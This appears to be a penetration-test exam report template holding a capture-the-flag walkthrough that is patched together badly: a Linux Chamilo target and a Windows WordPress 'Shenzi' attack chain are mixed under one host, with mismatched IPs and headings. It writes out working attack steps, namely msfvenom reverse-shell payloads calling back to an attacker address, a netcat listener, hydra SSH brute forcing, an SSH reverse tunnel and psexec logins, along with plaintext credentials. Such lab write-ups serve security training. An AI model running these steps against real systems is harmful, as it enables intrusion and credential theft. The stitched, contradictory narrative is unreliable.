- **4. Independent Challenges**
- **4.1 Target #1 –** **10.10.11.23**
- **4.1.1 Initial Access – Vulnerability  LMS to Chamilo  RCE**

**Vulnerability Explanation:** The SMB server is not protected with the password and has some sensitive information like credentials stored. Which leads to RCE from wordpress theme editor.

**Vulnerability Fix:** The SMB should be configured with credentials and guest enumeration should be disabled.

**Severity:** **Critical**

**Steps to reproduce the attack:** Ran the initial service scan John discovered that this host is called Sehnzi. Smbclient was used to interact on the port 445 to get the passwords.txt file from SMB share shenzi and used those credentials for wordpress admin access.

- **4.1.1 Service Enumeration**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.10.11.23 | **TCP**: 22, 80 |

We run nmap to scan the target and found a few ports open.

└─$ nmap -p- 10.10.11.23 --min-rate 20000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 15:19 JST

Nmap scan report for permx.htb (10.10.11.23)

Host is up (0.24s latency).

Not shown: 65494 filtered tcp ports (no-response), 39 closed tcp ports (conn-refused)

PORT   STATE SERVICE

22/tcp open  ssh

80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.91 seconds

![[PermX image.png]]

└─$ nmap -p22,80 -sCV 10.10.11.23

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-25 15:22 JST

Nmap scan report for permx.htb (10.10.11.23)

Host is up (0.54s latency).

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)

\| ssh-hostkey:

\|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)

\|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)

80/tcp open  http    Apache httpd 2.4.52

\|_http-title: eLEARNING

\|_http-server-header: Apache/2.4.52 (Ubuntu)

Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 33.69 seconds

![[PermX image 1.png]]

**4.1.2** **Initial Access –**

![[PermX image 2.png]]

https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit/

![[PermX image 3.png]]

![[PermX image 4.png]]

find / -type f -perm -4000 2>/dev/null

www-data@permx:/var/www/chamilo/app/config$ cat configuration.php | grep db_

![[PermX image 5.png]]

cat configuration.php | grep db_

$_configuration\['db_host'\] = 'localhost';

$_configuration\['db_port'\] = '3306';

$_configuration\['db_user'\] = 'chamilo';

$_configuration\['db_password'\] = '03F6lY3uXAP2bkW8';

$_configuration\['db_manager_enabled'\] = false;

//$_configuration\['session_stored_in_db_as_backup'\] = true;

//$_configuration\['sync_db_with_schema'\] = false;

www-data@permx:/var/www/chamilo/app/config$ mysql -u chamilo -p

mysql -u chamilo -p

Enter password: 03F6lY3uXAP2bkW8

Welcome to the MariaDB monitor.  Commands end with ; or \g.

Your MariaDB connection id is 79

Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB \[(none)\]> show databases;

show databases;

+--------------------+

\| Database           |

+--------------------+

\| chamilo            |

\| information_schema |

+--------------------+

2 rows in set (0.001 sec)

MariaDB \[(none)\]> use chamilo;

use chamilo;

Reading table information for completion of table and column names

You can turn off this feature to get a quicker startup with -A

Database changed

![[PermX image 6.png]]

MariaDB \[chamilo\]> select username,password from user;

select username,password from user;

+----------+--------------------------------------------------------------+

\| username | password                                                     |

+----------+--------------------------------------------------------------+

\| admin    | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra |

\| anon     | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |

+----------+--------------------------------------------------------------+

2 rows in set (0.001 sec)

![[PermX image 7.png]]

└─$ ssh mtz@10.10.11.23

mtz@10.10.11.23's password: ==🟡03F6lY3uXAP2bkW8==

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

\* Documentation:  https://help.ubuntu.com

\* Management:     https://landscape.canonical.com

\* Support:        https://ubuntu.com/pro

System information as of Sun Aug 25 10:51:17 AM UTC 2024

System load:  0.02              Processes:             237

Usage of /:   61.0% of 7.19GB   Users logged in:       0

Memory usage: 23%               IPv4 address for eth0: 10.10.11.23

Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.

See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Aug 25 10:51:20 2024 from 10.10.16.60

mtz@permx:~$

SMB revlead a ‘Shenzi’ share which was not protected with password and has interesting files for us.

==🔴└─$ smbclient -L== ==🔴\\\\192.168.232.55==

==🔴└─$ smbclient== ==🔴\\\\192.168.232.55\\shenzi==

==🔴Password for \[WORKGROUP\kali\]:==

==🔴Try "help" to get a list of possible commands.==

==🔴smb: \> ls==

==🔴.                                   D        0  Thu May 28 19:45:09 2020==

==🔴..                                  D        0  Thu May 28 19:45:09 2020==

==🔴passwords.txt                A     894  Thu May 28 19:45:09 2020==

==🔴readme_en.txt               A   7367  Thu May 28 19:45:09 2020==

==🔴sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 19:45:09 2020==

==🔴why.tmp                        A      213  Thu May 28 19:45:09 2020==

==🔴xampp-control.ini           A      178  Thu May 28 19:45:09 2020==

==🔴12941823 blocks of size 4096. 5850488 blocks available==

Shenzi share has passwords.txt file, we will download it which can be used for login in wordpress admin account.

==🔴└─$ smb: \> get passwords.txt==

![[PermX image 8.png]]

==🔴└─$ cat passwords.txt==

From all the password admin:FeltHeadwallWight357 looks interesting, We couldn’t find any interesting directory with our directory busting enumeration using common wordlists, however if use our Share name it revels a wordpress site.

==🔴└─$== ==🔴http://192.168.232.55/shenzi/==

![[PermX image 9.png]]

We used initially discovered credentials admin:FeltHeadwallWight357  from the SMB share to login into wordpress.

==🔴└─$== ==🔴http://192.168.232.55/shenzi/wp-login.php==

![[PermX image 10.png]]

After successfully logged in, we'll navigate to Appearance -> Theme Editor -> Theme Twenty Twenty to determine the active website theme. If we select a .php page (such as 404.php) we discover that we can directly edit the page's source code.

==🔴http://192.168.232.55/shenzi/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty==

![[PermX image 11.png]]

We generated meterpreter payload with MSF and updated 404.php code with it to get a RCE .

==🔴└─$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.45.154 lport=443 -f raw > shell.php==

![[PermX image 12.png]]

![[PermX image 13.png]]

After updating 404.php file we will visit http://192.168.232.55/shenzi/wp-content/themes/twentytwenty/404.php to execute the reverse shell and catch it using multi/handler.

![[PermX image 14.png]]

Meanwhile, on our Metasploit console:

![[PermX image 15.png]]

Since PHP reverse shells are somewhat unstable, let's upload a more stable shell, which we'll generate with msfvenom and uploading using meterpreter.

==🔴└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=139 -f exe > shell.exe==

![[PermX image 16.png]]

On Kali attacking machine:

==🔴└─$ sudo nc -lvp 139==

On Meterpreter session:

==🔴meterpreter > upload shell.exe==

==🔴meterpreter > execute -f shell.exe==

![[PermX image 17.png]]

![[PermX image 18.png]]

**Local.txt value:**f4900f2239e35781b8d2a648b3bafb72

==🔴└─$ whoami && ipconfig && type local.txt==

![[PermX image 19.png]]

**4.1.3** **Privilege Escalation - AlwaysInstallElevated**

mtz@permx:~$ sudo -l

Matching Defaults entries for mtz on permx:

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:

(ALL : ALL) NOPASSWD: /opt/acl.sh

mtz@permx:~$ cat /opt/acl.sh

#!/bin/bash

if \[ "$#" -ne 3 \]; then

/usr/bin/echo "Usage: $0 user perm file"

exit 1

fi

user="$1"

perm="$2"

target="$3"

if \[\[ "$target" != /home/mtz/* || "$target" == *..* \]\]; then

/usr/bin/echo "Access denied."

exit 1

fi

\# Check if the path is a file

if \[ ! -f "$target" \]; then

/usr/bin/echo "Target must be a file."

exit 1

fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"

![[PermX image 20.png]]

![[PermX image 21.png]]

mtz@permx:~$ sudo su

\[sudo\] password for mtz:

root@permx:/home/mtz# cat /root/root.txt

ad9c9a2b216c67785b7943a88387ebea

![[PermX image 22.png]]

**4.1.4** **Post Exploitation**

**Proof.txt value:**

==🔴c:\Users\Administrator\Desktop> whoami && ipconfig && type proof.txt==

![[PermX image 23.png]]

- **5. Active Directory Set**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.4.4.10 | **TCP:** 22, 80 |
| 10.5.5.20 | **TCP:** 135, 139, 445, 3389 |
| 10.5.5.30 | **TCP:** 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389 |

- **5.1 Ajla – 10.4.4.10**
- **5.1.1 Initial Access – Password Brute-Forcing**

**Vulnerability Explanation:** The user account on the Ajla host was protected by a trivial password that was cracked within 5 minutes of brute-forcing.

**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.

**Severity:** **Critical**

**Steps to reproduce the attack:** rom the initial service scan John discovered that this host is called Ajla. After adding the target’s IP to the /etc/hosts file, the Hydra tool was run against the SSH service using the machine’s DNS name instead of its IP. With the extracted password at hand John was able to log in as ajla using SSH.

==🔴└─$ hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh==

![[PermX image 24.png]]

- **5.1.2 Privilege Escalation – Sudo group**

**Vulnerability Explanation:** sudo group allows any user in this group to escalate privileges to the root if they know the user’s password.

**Vulnerability Fix:** The SSH service should be configured to not accept password-based logins and the user account itself should contain a unique password not contained in the publicly available wordlists.

**Severity:** **Critical**

**Steps to reproduce the attack:** John spotted that the ajla user was a member of the sudo group immediately upon logging in and using the “id” command. And knowing user’s password, he only needed to use a single command “sudo su” in order to obtain a root shell.

![[PermX image 25.png]]

- **5.1.3 Post-Exploitation**

**System Proof screenshot:**

![[PermX image 26.png]]

After collecting the proof files and establishing a backdoor using SSH, John began the enumeration of the filesystem for the presence of interesting files. He noticed that there was a mounted share originating from the 10.5.5.20 IP. Inspecting a custom sysreport.ps1 script in the /mnt/scripts directory he found cleartext credentials for the “sandbox\alex” user. Taking into consideration the type of scripts in this directory and the username structure, it seems that the “Poultry” host is a part of the Active Directory environment.

![[PermX image 27.png]]

John began the lateral movement by establishing a reverse dynamic port forwarding using SSH. First, he generated a new pair of SSH keys and added those to the authorized_keys file on his Kali VM, then he just needed to issue a single SSH port forwarding command:

==🔴└─$== ==🔴ssh-keygen -t rsa -N ‘’ -f ~/.ssh/key==

==🔴└─$== ==🔴ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key== [==🔴kali@192.168.119.164==](mailto:kali@192.168.119.164)

With the dynamic reverse tunnel established, John only needed to edit the /etc/proxychains.conf to use the port 1080.

- **5.2 Poultry – 10.5.5.20**
- **5.2.1 Initial Access – RDP login**

**Steps to reproduce the attack:** with the credentials at hand and a reverse tunnel established, John connected to an RDP session using proxychains accepting the certificate when prompted and entering the retrieved password afterward.

==🔴└─$== ==🔴proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard==

- **5.2.2 Post-Exploitation**

**Local Proof Screenshot:**

![[PermX image 28.png]]

John noticed the presence of the Thunderbird program on the user’s desktop, and while checking Alex’s inbox he found the email from a local administrator Roger:

![[PermX image 29.png]]

- **5.3 DC – 10.5.5.30**
- **5.3.1 Initial Access – Remote Commands Execution**

**Steps to reproduce the attack:** John was able to reuse a temporary password that the administrator left for Alex.

==🔴└─$== ==🔴proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:==[==🔴UWyBGeTp3Bhw7f@10.5.5.30==](mailto:UWyBGeTp3Bhw7f@10.5.5.30)

![[PermX image 30.png]]

- **5.3.2 Post-Exploitation**

**System Proof Screenshot:**

![[PermX image.jpg]]